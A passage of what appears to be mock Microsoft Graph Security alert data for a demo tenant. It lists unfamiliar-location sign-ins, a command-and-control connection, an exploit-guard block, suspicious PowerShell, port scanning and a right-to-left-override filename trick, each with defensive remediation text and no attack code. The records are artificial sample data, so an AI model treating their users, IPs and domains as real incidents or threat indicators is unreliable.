            "lastModifiedDateTime": "2020-05-19T10:40:00Z",
            "recommendedActions": [],
            "severity": "low",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [
                {
                    "name": "userState.logonIp",
                    "type": "string",
                    "value": "95.142.39.253"
                }
            ],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "95.142.39.253",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "F43C91E1-F53F-407B-8252-9DB957D14248",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T22:08:41.5776181Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T22:02:22.4009228Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T22:13:07.8377082Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "deliad",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "deliad@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "EFC1C4FC-E374-4ED2-B080-122EC3716F23",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T22:01:36.759502Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T21:57:07.310749Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T22:08:05.7492214Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "betsyd",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "betsyd@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "4BACF1F9-2979-4FE5-9477-B44F7CA4B4FD",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T21:53:27.5243146Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T21:47:47.297699Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T21:55:55.2158336Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "357BCCEB-955B-4E49-B7FA-2B8ADA04D284",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T18:29:42.0775688Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T18:23:42.5111478Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T18:33:07.6446851Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "deliad",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "deliad@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "017CCAD0-4BBD-4419-9445-078B35FD9E9B",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T18:27:06.5650897Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T18:20:29.5952879Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T18:30:43.8506233Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "betsyd",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "betsyd@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "FB8F3278-88BC-4536-9353-F949919BBE4E",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T18:21:01.4314701Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T18:18:29.1832451Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T18:29:48.20682Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "adamw",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "adamw@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "D0905D32-232D-44D1-9301-3756E3C8F372",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T16:14:29.5269321Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T16:11:10.4282754Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T16:21:08.4059356Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "alicel",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "alicel@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "165445F7-DFB5-466C-82A5-98F976FF5F3C",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "",
            "category": "UnfamiliarLocation",
            "closedDateTime": "null",
            "comments": [],
            "confidence": 0,
            "createdDateTime": "2020-05-18T16:01:21.1634187Z",
            "description": "User logged in from a new unfamiliar location based on user’s past login history.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T15:55:29.7827133Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T16:06:34.0790137Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "newAlert",
            "title": "Sign-in from an unfamiliar location",
            "vendorInformation": {
                "provider": "Azure AD Identity Protection",
                "providerVersion": "3.0",
                "subProvider": "null",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "",
                    "accountName": "christiec",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "0",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "",
                    "riskScore": "0",
                    "userAccountType": "null",
                    "userPrincipalName": "christiec@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "F007461A-C92F-48E5-A734-89A4E5F38A15",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "Bad Hacker",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "Command and  Control",
            "closedDateTime": "null",
            "comments": [
                "Seeing evidence that the domain is malicious"
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-22T15:32:00Z",
            "description": "A Windows process has connected to a newly registered domain.",
            "detectionIds": [],
            "eventDateTime": "2020-05-22T15:31:00Z",
            "feedback": "TruePositive",
            "lastModifiedDateTime": "2020-05-22T15:32:00Z",
            "recommendedActions": [
                "Update AV signatures and run a full scan. The scan might reveal and remove previously-undetected malware components.  It is highly unusual for a Windows process to connect to a newly created domain, unless the domain is registered to Microsoft or an affiliate. Investigate the Whois record associated with the domain to confirm the domain is not owned by a trusted party. (Click the icon next to the domain name to see additional information about this domain, such as what individual or entity registered the domain, when it was registered, and in what country.)  Also consider the nature of the domain - if it appears to provide a legitimate proxy service, and other processes on the machine are connecting to the same domain, it is possible that this connection is benign.  Investigate surrounding events in the Machine Timeline - if malicious, the alerting process may exhibit other unusual behavior, such as connecting to numerous other untrusted domains (frequently these are also newly registered) or writing files to disk.  If suspicions are confirmed, pivot through the domain as well as any IP addresses with which the domain is associated, in order to locate other potentially compromised machines."
            ],
            "severity": "low",
            "sourceMaterials": [
                "https://securitycenter.windows.com/alerts/19506a6b-e7eb-4106-a932-3691839b9b4f"
            ],
            "status": "inProgress",
            "title": "Connection to newly registered domain",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "EDR",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-aldom",
                    "os": "null",
                    "privateIpAddress": "10.8.198.9",
                    "publicIpAddress": "172.16.32.38",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "null",
                    "destinationDomain": "www.febrikam.com",
                    "destinationPort": "null",
                    "destinationUrl": "null",
                    "direction": "inbound",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ipv4",
                    "riskScore": "null",
                    "sourceAddress": "172.16.32.38",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "0F72C58F-1D01-4284-BB32-C53DD45B5C01",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "exploit",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-21T15:37:00Z",
            "description": "A process suspiciously tried to access the export address table (EAT) to look for potentially useful APIs. This might indicate an exploitation attempt. The process svchost.exe, with process ID 404, tried accessing the Export Address table for module C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll and was blocked",
            "detectionIds": [],
            "eventDateTime": "2020-05-21T15:12:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-21T16:55:00Z",
            "recommendedActions": [
                "Validate the alert, collect artifacts, and determine scope. If possible, upgrade the software containing the vulnerable driver to an updated version without the vulnerability."
            ],
            "severity": "high",
            "sourceMaterials": [
                "https://beta.securitycenter.windows.com/alert/1872609273_636353916002745581"
            ],
            "status": "newAlert",
            "title": "Exploit Guard blocked dynamic code execution",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "DeviceGuard",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "ntdll.dll",
                    "path": "C:\\Windows\\SYSTEM32\\ntdll.dll",
                    "riskScore": "null",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.m365x595651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-aldom",
                    "os": "null",
                    "privateIpAddress": "10.8.198.7",
                    "publicIpAddress": "172.16.37.134",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "NT AUTHORITY\\SYSTEM",
                    "commandLine": "svchost.exe -k WerSvcGroup",
                    "createdDateTime": "2018-11-08T23:45:35Z",
                    "integrityLevel": "unknown",
                    "isElevated": True,
                    "name": "svchost.exe",
                    "parentProcessCreatedDateTime": "2018-11-06T23:35:31Z",
                    "parentProcessId": 628,
                    "parentProcessName": "services.exe",
                    "path": "C:\\Windows\\System32\\svchost.exe",
                    "processId": 6232,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "S-1-5-21-2240959070-459921296-192865976-2611",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "remoteInteractive",
                    "onPremisesSecurityIdentifier": "S-1-5-86-615999462-62705297-2911207457-59056572-3668589840",
                    "riskScore": "null",
                    "userAccountType": "administrator",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "11BC6B30-D5EE-425A-89C9-595B1046CDCD",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "Bad Hacker",
            "assignedTo": "analyst@M365x594651.onmicrosoft.com",
            "category": "suspiciousActivity",
            "closedDateTime": "2020-05-21T15:32:00Z",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-21T15:32:00Z",
            "description": "A powershell script with suspicious content was observed running on this machine. Such a script may be used for malware installation or other malicious activity.",
            "detectionIds": [],
            "eventDateTime": "2020-05-21T15:31:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-21T15:32:00Z",
            "recommendedActions": [
                "1. Examine the scripting tool's command-line to understand what commands/scripts were executed.  2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers) and dropped files.  3. Explore the timeline of this and other related machines for additional suspicious activities around the time of the alert.  4. Inspect processes and files in the execution chain. Consider submitting any suspicious files in the chain for deep analysis for detailed behavior information."
            ],
            "severity": "medium",
            "sourceMaterials": [
                "https://securitycenter.windows.com/alerts/32f857cb-64e2-43a8-bb53-5b08d707fc75"
            ],
            "status": "inProgress",
            "title": "A powershell script with suspicious content was observed",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "EDR",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-aldom",
                    "os": "null",
                    "privateIpAddress": "10.8.198.19",
                    "publicIpAddress": "172.16.33.98",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [
                {
                    "applicationName": "null",
                    "destinationAddress": "78.108.83.153",
                    "destinationDomain": "null",
                    "destinationPort": "null",
                    "destinationUrl": "null",
                    "direction": "outbound",
                    "domainRegisteredDateTime": "null",
                    "localDnsName": "null",
                    "natDestinationAddress": "null",
                    "natDestinationPort": "null",
                    "natSourceAddress": "null",
                    "natSourcePort": "null",
                    "protocol": "ipv4",
                    "riskScore": "null",
                    "sourceAddress": "172.16.33.98",
                    "sourcePort": "null",
                    "status": "null",
                    "urlParameters": "null"
                }
            ],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "E9B9C196-C7D8-44C8-81C7-E0DDC008A4CA",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst3@M365x594651.onmicrosoft.com",
            "category": "suspiciousActivity",
            "closedDateTime": "null",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-20T15:37:00Z",
            "description": "IP TCP/UDP (Internet Protocol Transmission Control Protocol/User Datagram Protocol) port scanner detected. A port scanner allows an adversary to identify machines and discover services that run on those machines.",
            "detectionIds": [],
            "eventDateTime": "2020-05-20T15:11:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-20T16:55:00Z",
            "recommendedActions": [
                "Validate that your firewall is not disabled, update services running on open ports, and close unused ports."
            ],
            "severity": "low",
            "sourceMaterials": [
                "https://beta.securitycenter.windows.com/alert/1872609273_636353916002745581"
            ],
            "status": "inProgress",
            "title": "A port scanning tool was detected",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2",
                "subProvider": "DeviceGuard",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "ntdll.dll",
                    "path": "C:\\Windows\\SYSTEM32\\ntdll.dll",
                    "riskScore": "null",
                    "fileHash": "null"
                }
            ],
            "hostStates": [
                {
                    "fqdn": "dt-aldom.M365x594651.onmicrosoft.com",
                    "isAzureAdJoined": False,
                    "isAzureAdRegistered": True,
                    "isHybridAzureDomainJoined": "null",
                    "netBiosName": "dt-aldom",
                    "os": "null",
                    "privateIpAddress": "10.8.198.7",
                    "publicIpAddress": "172.16.37.84",
                    "riskScore": ""
                }
            ],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [
                {
                    "accountName": "NT AUTHORITY\\SYSTEM",
                    "commandLine": "svchost.exe -k WerSvcGroup",
                    "createdDateTime": "2018-11-11T23:45:35Z",
                    "integrityLevel": "unknown",
                    "isElevated": True,
                    "name": "svchost.exe",
                    "parentProcessCreatedDateTime": "2018-11-10T23:35:31Z",
                    "parentProcessId": 628,
                    "parentProcessName": "services.exe",
                    "path": "C:\\Windows\\System32\\svchost.exe",
                    "processId": 6232,
                    "fileHash": "null"
                }
            ],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "aldom",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "S-1-5-21-2240959070-459921296-192865976-2611",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "remoteInteractive",
                    "onPremisesSecurityIdentifier": "S-1-5-86-615999462-62705297-2911207457-59056572-3668589840",
                    "riskScore": "null",
                    "userAccountType": "administrator",
                    "userPrincipalName": "aldom@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "EF76CDE9-C3C4-4A83-9707-9EF003C379BB",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "analyst@contoso.com",
            "category": "Social Engineering",
            "closedDateTime": "2020-05-20T09:14:09Z",
            "comments": [
                "pen test"
            ],
            "confidence": "null",
            "createdDateTime": "2020-05-20T09:14:09Z",
            "description": "Attackers can implant the right-to-left-override (RLO) in a filename to change the order of the characters in the filename and make it appear legitimate.  This technique is used in different social engineering attacks to convince the user to run the file, and may also be used for hiding purposes.  The file photoviewgpj.ps1 disguises itself as photoview1sp.jpg",
            "detectionIds": [],
            "eventDateTime": "2020-05-20T15:31:00Z",
            "feedback": "FalsePositive",
            "lastModifiedDateTime": "2020-05-20T15:32:00Z",
            "recommendedActions": [],
            "severity": "medium",
            "sourceMaterials": [],
            "status": "inProgress",
            "title": "Right-to-Left-Override (RLO) technique observed",
            "vendorInformation": {
                "provider": "Windows Defender ATP",
                "providerVersion": "3.10.2002",
                "subProvider": "EDR",
                "vendor": "Microsoft"
            },
            "cloudAppStates": [],
            "fileStates": [
                {
                    "name": "photoview1sp.jpg",
                    "path": "c:\\\\temp\\\\photoview1sp.jpg",
                    "riskScore": "",
                    "fileHash": {
                        "hashType": "sha256",
                        "hashValue": "091835b16192e526ee1b8a04d0fcef534544cad306672066f2ad6973a4b18b19"
                    }
                }
            ],
            "hostStates": [],
            "historyStates": [],
            "malwareStates": [],
            "networkConnections": [],
            "processes": [],
            "registryKeyStates": [],
            "triggers": [],
            "userStates": [
                {
                    "aadUserId": "null",
                    "accountName": "douglasf",
                    "domainName": "M365x594651.onmicrosoft.com",
                    "emailRole": "unknown",
                    "isVpn": "null",
                    "logonDateTime": "null",
                    "logonId": "null",
                    "logonIp": "null",
                    "logonLocation": "null",
                    "logonType": "null",
                    "onPremisesSecurityIdentifier": "null",
                    "riskScore": "null",
                    "userAccountType": "null",
                    "userPrincipalName": "douglasf@M365x594651.onmicrosoft.com"
                }
            ],
            "vulnerabilityStates": []
        },
        {
            "id": "F42BFF8C-519A-4DE9-A655-1DA0EA511DFD",
            "azureTenantId": "00000001-0001-0001-0001-000000000001",
            "azureSubscriptionId": "null",
            "riskScore": "null",
            "tags": [],
            "activityGroupName": "null",
            "assignedTo": "null",
            "category": "suspiciousActivity",
            "closedDateTime": "2020-05-18T15:32:00Z",
            "comments": [],
            "confidence": "null",
            "createdDateTime": "2020-05-18T15:32:00Z",
            "description": "A suspicious Powershell commandline was found on the machine. This commandline might be used during installation, exploration, or in some cases with lateral movement activities which are used by attackers to invoke modules, download external payloads, and get more information about the system. Attackers usually use Powershell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
            "detectionIds": [],
            "eventDateTime": "2020-05-18T15:31:00Z",
            "feedback": "null",
            "lastModifiedDateTime": "2020-05-18T15:32:00Z",
            "recommendedActions": [
                "1. Examine the PowerShell commandline to understand what commands were executed. Note: the script may need to be decoded if it is base64-encoded.  2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.  3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.  4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information."
            ],
            "severity": "medium",
            "sourceMaterials": [
                "https://securitycenter.windows.com/alerts/4fdecbad-1b66-4b9f-88ae-d81e33f30d0b"
            ],
            "status": "newAlert",
            "title": "Suspicious Powershell commandline",
            "vendorInformation": {
